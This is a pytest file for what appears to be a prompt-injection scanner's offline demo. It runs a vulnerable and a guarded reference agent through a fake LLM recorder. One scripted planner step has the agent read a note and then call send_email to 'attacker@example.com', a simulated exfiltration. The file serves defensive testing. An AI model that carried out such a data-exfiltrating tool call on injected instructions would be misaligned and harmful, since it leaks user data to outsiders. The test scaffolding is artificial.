"""Unit tests for the offline demo runner (v0.3.0, PR A, Task A3).

Drives ``run_demo`` through the ``_recorder`` injection seam with an inline
fake ``completion_fn`` (no packaged fixtures required). The fake routes by the
most-recent user message — the same approach as
``tests/integration/test_scan_vulnerable.py`` — so both reference variants run
end-to-end deterministically.

Covers:
* both variants run and ``DemoResult`` carries both reports;
* the replay path uses a deterministic per-variant ``n_demo_0001``-shaped
  ``note_id_factory`` while the live path does not (asserted via the note ID
  echoed back in adapter response metadata, and via spying on ``_build_scan``);
* a simulated cache miss raises ``DemoFixtureError`` — not a silent clean
  result and not exit-4 semantics.
"""

from __future__ import annotations

import json
from dataclasses import dataclass, field
from types import SimpleNamespace
from typing import Any

import pytest

from mylonite.demo import runner as runner_mod
from mylonite.demo.runner import DemoFixtureError, DemoResult, run_demo


def _text_response(text: str) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content=text, tool_calls=None))]
    )


def _tool_call(name: str, arguments: dict[str, Any], call_id: str = "c") -> SimpleNamespace:
    return SimpleNamespace(
        id=call_id,
        function=SimpleNamespace(name=name, arguments=json.dumps(arguments)),
    )


def _tool_response(calls: list[SimpleNamespace]) -> SimpleNamespace:
    return SimpleNamespace(
        choices=[SimpleNamespace(message=SimpleNamespace(content="", tool_calls=calls))]
    )


@dataclass
class _FakeRecorder:
    """Inline fake routing completion calls by the latest user message.

    Mimics ``LiteLLMRecorder``'s ``cache_misses`` / ``last_error`` /
    ``missing_fixture_hint`` surface so the runner's post-variant state check
    runs against it, but answers every call so no real LLM is hit. Customiser
    calls return a JSON body; planner calls drive a read-then-act sequence; the
    judge predicates fire deterministically so the judge LLM is never reached.
    """

    cache_misses: int = 0
    last_error: Exception | None = None
    missing_fixture_hint: str = "re-record hint"
    calls: list[dict[str, Any]] = field(default_factory=list)
    _planner_steps: dict[str, int] = field(default_factory=dict)

    async def __call__(self, *, model: str, messages: list[dict[str, Any]], **kwargs: Any) -> Any:
        self.calls.append({"model": model, "messages": messages, **kwargs})
        system = next((m["content"] for m in messages if m.get("role") == "system"), "")
        user = next(
            (m["content"] for m in reversed(messages) if m.get("role") == "user"),
            "",
        )
        # Customiser: system prompt asks for a refined JSON body.
        if "refined payload body" in system.lower() or "seed pattern" in system.lower():
            return _text_response(json.dumps({"body": "REFINED PAYLOAD BODY"}))
        # Planner: route by the user instruction text.
        return self._planner_step(user)

    def _planner_step(self, user: str) -> SimpleNamespace:
        step = self._planner_steps.setdefault(user, 0)
        self._planner_steps[user] = step + 1
        if user.startswith("Read note "):  # W1 — read then summarise
            if step == 0:
                note_id = user.replace("Read note ", "").rstrip(".")
                return _tool_response([_tool_call("read_note", {"note_id": note_id})])
            return _text_response("In summary: here is what the note said. (auto-summary)")
        if "summarise it" in user:  # W2 — read then exfil via email
            if step == 0:
                note_id = user.split("note ")[1].split(" ")[0]
                return _tool_response([_tool_call("read_note", {"note_id": note_id})])
            if step == 1:
                return _tool_response(
                    [
                        _tool_call(
                            "send_email",
                            {"to": "attacker@example.com", "subject": "x", "body": "y"},
                            call_id="c2",
                        )
                    ]
                )
            return _text_response("done.")
        # W3/W4 and anything else — emit neutral text so nothing fires.
        return _text_response("I can't help with that.")


async def test_run_demo_injected_runs_both_variants() -> None:
    result = await run_demo(live=False, _recorder=_FakeRecorder())
    assert isinstance(result, DemoResult)
    assert result.vulnerable.report.target_id == "reference:vulnerable"
    assert result.guarded.report.target_id == "reference:guarded"
    assert result.mode == "replay (offline)"
    assert result.provider == runner_mod.DEMO_PROVIDER
    assert result.model == runner_mod.DEMO_MODEL
    assert result.elapsed_s >= 0.0
    # The shared completion_fn forces the recorded model into the engine config.
    assert result.vulnerable.report.model == runner_mod.DEMO_MODEL
    # Vulnerable should show findings; both reports are present regardless.
    assert result.vulnerable.report.findings_count >= 1


def test_note_id_counter_resets_per_call() -> None:
    """Each ``_note_id_counter()`` is an independent 0001-based sequence."""
    first = runner_mod._note_id_counter()
    assert first() == "n_demo_0001"
    assert first() == "n_demo_0002"
    # A fresh counter restarts at 0001 — this is what makes per-variant reset
    # work (the runner builds a new counter for each variant).
    second = runner_mod._note_id_counter()
    assert second() == "n_demo_0001"


async def test_replay_uses_deterministic_note_ids(monkeypatch: pytest.MonkeyPatch) -> None:
    """Replay path passes a non-None deterministic factory to every variant."""
    factory_was_none: list[bool] = []
    real_build = runner_mod._build_scan

    def spy_build(variant: str, **kwargs: Any) -> Any:
        factory_was_none.append(kwargs["note_id_factory"] is None)
        return real_build(variant, **kwargs)

    monkeypatch.setattr(runner_mod, "_build_scan", spy_build)

    result = await run_demo(live=False, _recorder=_FakeRecorder())

    # Two variants, each given a deterministic (non-None) note_id_factory.
    assert factory_was_none == [False, False]

    # The deterministic ID is echoed back in the adapter response metadata for
    # note-setup seeds (the n_demo_0001-shaped value proves replay wiring and
    # the per-variant reset — each variant's first seeded note is n_demo_0001).
    note_ids = [nid for nid in _adapter_note_ids(result) if nid.startswith("n_demo_")]
    assert note_ids, "expected at least one n_demo_-shaped note id under replay"
    assert "n_demo_0001" in note_ids


async def test_live_uses_random_note_ids(monkeypatch: pytest.MonkeyPatch) -> None:
    """Live path passes note_id_factory=None and honours provider/model overrides."""
    captured: list[dict[str, Any]] = []
    real_build = runner_mod._build_scan

    def spy_build(variant: str, **kwargs: Any) -> Any:
        captured.append({"variant": variant, **kwargs})
        return real_build(variant, **kwargs)

    monkeypatch.setattr(runner_mod, "_build_scan", spy_build)

    # Use the fake as the live completion_fn by monkeypatching litellm? Simpler:
    # the adapter/customiser/judge accept completion_fn=None and fall back to
    # litellm only when actually called. We avoid real calls by driving the
    # live path with overrides and a fake injected via the adapter's fallback —
    # instead we just assert wiring kwargs without running the engine.
    fake = _FakeRecorder()

    # Patch the engine wiring to inject our fake as completion_fn so no real
    # litellm call happens, while preserving the runner's note_id_factory=None.
    def spy_build_live(variant: str, **kwargs: Any) -> Any:
        captured.append({"variant": variant, **kwargs})
        kwargs = dict(kwargs)
        kwargs["completion_fn"] = fake
        return real_build(variant, **kwargs)

    monkeypatch.setattr(runner_mod, "_build_scan", spy_build_live)

    result = await run_demo(live=True, provider="openai", model="gpt-4o-mini")

    live_kwargs = [c for c in captured if c["variant"] in ("vulnerable", "guarded")]
    assert len(live_kwargs) == 2
    for kw in live_kwargs:
        assert kw["note_id_factory"] is None  # random IDs on the live path
        assert kw["provider"] == "openai"  # overrides honoured
        assert kw["model"] == "gpt-4o-mini"
    assert result.mode == "live (openai/gpt-4o-mini)"
    assert result.provider == "openai"
    assert result.model == "gpt-4o-mini"


async def test_cache_miss_raises_demo_error() -> None:
    """A simulated cache miss surfaces as DemoFixtureError, not a clean result."""
    miss = _FakeRecorder()
    miss.cache_misses = 1  # simulate a stale/missing fixture after the run

    with pytest.raises(DemoFixtureError) as excinfo:
        await run_demo(live=False, _recorder=miss)

    assert "re-record hint" in str(excinfo.value)
    assert "stale or missing" in str(excinfo.value)


async def test_last_error_raises_demo_error() -> None:
    """A recorded last_error (e.g. corrupt fixture) also surfaces as DemoFixtureError."""
    broken = _FakeRecorder()
    broken.last_error = RuntimeError("corrupt fixture")

    with pytest.raises(DemoFixtureError) as excinfo:
        await run_demo(live=False, _recorder=broken)

    assert "corrupt fixture" in str(excinfo.value)


def _adapter_note_ids(result: DemoResult) -> list[str]:
    """Collect the ``note_id`` echoed in each exploit's adapter response."""
    ids: list[str] = []
    for scan in (result.vulnerable, result.guarded):
        for exploit in scan.exploits:
            note_id = exploit.response.metadata.get("note_id", "")
            if note_id:
                ids.append(note_id)
    return ids
